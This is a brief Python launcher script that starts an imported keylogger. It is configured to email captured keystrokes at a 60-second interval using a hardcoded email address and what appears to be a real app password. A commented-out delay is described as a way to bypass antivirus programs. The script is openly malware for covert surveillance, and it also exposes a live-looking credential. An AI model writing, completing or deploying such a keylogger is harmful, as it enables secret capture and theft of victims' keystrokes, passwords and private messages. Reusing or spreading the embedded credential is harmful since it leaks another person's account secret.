import keylogger
import time

if __name__ == '__main__':
    # time.sleep(120) #Used to bypass some of the antivirus programs

    #Set Up Variables
    timer = 60
    your_email = 'learner.vishwas.kapoor@gmail.com'
    email_pass = 'qvdgkhlghlwvqvhn'

    my_keylogger = keylogger.KeyLogger(interval=timer, email=your_email, password=email_pass)
    my_keylogger.start()